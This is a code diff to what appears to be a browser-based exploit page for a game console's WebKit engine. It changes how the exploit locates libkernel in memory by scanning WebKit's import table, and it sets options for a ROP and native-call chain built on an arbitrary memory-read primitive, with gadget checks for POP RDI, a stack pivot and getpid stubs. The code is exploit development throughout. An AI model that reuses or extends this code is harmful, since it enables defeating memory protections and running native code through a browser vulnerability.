@@ -25,9 +25,14 @@ import {
     webkitRvaMaxFromOff,
     saveWebkitRvaProbe,
 } from "./pivot_gadgets.js";
+import {
+    resolveLibkernel,
+    scanErrorIatChunk,
+    isGetpidStub as lkIsGetpidStub,
+} from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828t";
+const BUILD_ID = "rw-20250828u";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -321,16 +326,14 @@ function checkPat(p, base, rva, pat) {
 }
 
 function isGetpidStub(v) {
-    if (!v) return false;
-    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
-    const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
-    return num === SYS_GETPID;
+    return lkIsGetpidStub(v);
 }
 
 /** Manual tests — one button = minimal reads, one log line. */
 const MANUAL_TESTS = [
     { id: "elf", group: "base", label: "ELF @ base" },
     { id: "native", group: "base", label: "nativeFn code" },
+    { id: "scan-iat", group: "base", label: "Scan IAT" },
     { id: "libkernel", group: "base", label: "libkernel" },
     { id: "stub20", group: "base", label: "getpid stub" },
     { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
@@ -393,31 +396,25 @@ function runManualTest(testId) {
                 mark("GADGET-SKIP", "libkernel — no webkitBase");
                 return;
             }
-            if (!off.wk___imp___error || !off.k__error) {
-                mark("GADGET-SKIP", "libkernel — no IAT offsets in table");
-                return;
-            }
-            const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
-            if (!errorFn) {
-                mark("GADGET-BAD", "IAT __imp___error null");
-                return;
-            }
-            const lk = errorFn.sub32(off.k__error);
-            const w0 = read4p(p, lk);
-            const w1 = read4p(p, lk.add32(4));
-            if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
-                try { sessionStorage.setItem("wk-libkernelBase", String(lk)); } catch (_) { }
-                mark("GADGET-OK", "libkernel " + lk + " _error prologue");
-            } else {
-                mark("GADGET-BAD", "libkernel " + lk + " w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
-            }
+            const r = resolveLibkernel(p, webkitBase, off, {
+                log: mark,
+                read8: read8p,
+            });
+            if (r.ok)
+                mark("GADGET-OK", "libkernel " + r.lk + " (" + r.source + ")");
+            else
+                mark("GADGET-BAD", r.error || "libkernel resolve failed");
+            return;
+        }
+        if (testId === "scan-iat") {
+            runScanIat();
             return;
         }
         if (testId === "stub20") {
             let lk = libkernelBase;
-            if (!lk && webkitBase && off.wk___imp___error && off.k__error) {
-                const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
-                if (errorFn) lk = errorFn.sub32(off.k__error);
+            if (!lk && webkitBase) {
+                const r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
+                if (r.ok) lk = r.lk;
             }
             if (!lk) {
                 mark("GADGET-SKIP", "getpid stub — run libkernel test first");
@@ -1637,15 +1634,76 @@ function captureNativeFnQuick(p, off) {
 }
 
 function resolveLibkernelBase(p, off, webkitBase) {
+    const r = resolveLibkernel(p, webkitBase, off, {
+        log: mark,
+        read8: read8p,
+    });
+    return r.ok ? r.lk : null;
+}
+
+let iatScanState = null;
+
+async function runScanIat() {
+    if (!ready || !window.p || busy) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase");
+        return;
+    }
+    if (iatScanState && !iatScanState.done) {
+        iatScanState = null;
+        mark("LK-STOP", "IAT scan cancelled");
+        return;
+    }
+    busy = true;
+    scanQuiet = true;
+    setUi();
+    iatScanState = null;
+    mark("LK-SCAN", "chunked GOT scan +0x800000…+0x"
+        + webkitRvaMax(off).toString(16) + " (never +0x3cb8cc8)");
     try {
-        const raw = sessionStorage.getItem("wk-libkernelBase");
-        if (raw) {
-            const b = parseAddr(String(raw).replace(/^0x/i, ""));
-            if (b) return b;
+        while (true) {
+            const chunk = scanErrorIatChunk(p, webkitBase, off, iatScanState);
+            iatScanState = chunk.state;
+            if (chunk.done && chunk.lk) {
+                mark("LK-OK", chunk.lk + " IAT +0x" + chunk.iatRva.toString(16));
+                state("libkernel OK", "ok");
+                break;
+            }
+            if (chunk.done) {
+                mark("LK-MISS", "no __imp___error in mapped webkit");
+                state("IAT scan miss", "bad");
+                break;
+            }
+            scanState("IAT @+0x" + iatScanState.cursor.toString(16));
+            await new Promise(r => setTimeout(r, 0));
         }
-    } catch (_) { }
-    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-    return errorFn.sub32(off.k__error);
+    } finally {
+        scanQuiet = false;
+        busy = false;
+        iatScanState = null;
+        setUi();
+    }
+}
+
+async function ensureLibkernel(p, off, webkitBase) {
+    let r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
+    if (r.ok) return r.lk;
+    mark("NATIVE-STEP", "IAT scan (13.00 +0x3cb8cc8 blocked)…");
+    let state = null;
+    while (true) {
+        const chunk = scanErrorIatChunk(p, webkitBase, off, state);
+        state = chunk.state;
+        if (chunk.done && chunk.lk) {
+            mark("LK-OK", chunk.lk + " IAT +0x" + chunk.iatRva.toString(16));
+            return chunk.lk;
+        }
+        if (chunk.done) break;
+        await new Promise(r => setTimeout(r, 0));
+    }
+    throw new Error("libkernel IAT not found — tap Scan IAT first");
 }
 
 function stripUiForNative() {
@@ -1692,21 +1750,23 @@ async function doNativeCallImmediate() {
         state("need cal base", "bad");
         return;
     }
-    const libkernelBase = resolveLibkernelBase(p, off, webkitBase);
+    const libkernelBase = await ensureLibkernel(p, off, webkitBase);
     if (nativeChain) {
         nativeChain.disarm();
         nativeChain = null;
     }
     mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase
         + " promoted=" + pairStatus.promoted);
+    mark("NATIVE-STEP", "init chain…");
     const { initNativeCall } = await import("./native_call.js");
     const chain = initNativeCall(p, off, {
         webkitBase,
         nativeFn,
         libkernelBase,
         log: mark,
-        trust: false,
-        noStubScan: true,
+        trustGadgets: true,
+        noStubScan: false,
+        stubScanMax: 0x8000,
         getpidOnly: true,
     });
     nativeChain = chain;
@@ -2060,7 +2120,7 @@ function init() {
     if (params.get("clearlog") === "1") clearPersistedLog();
     else if (RESTORE_LOG && restorePersistedLog()) renderOut();
 
-    mark("BOOT", "build=" + BUILD_ID + " — pivot 7/7 HW (G5 +0x13ec77a)");
+    mark("BOOT", "build=" + BUILD_ID + " — pivot 7/7; libkernel via IAT scan (not +0x3cb8cc8)");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
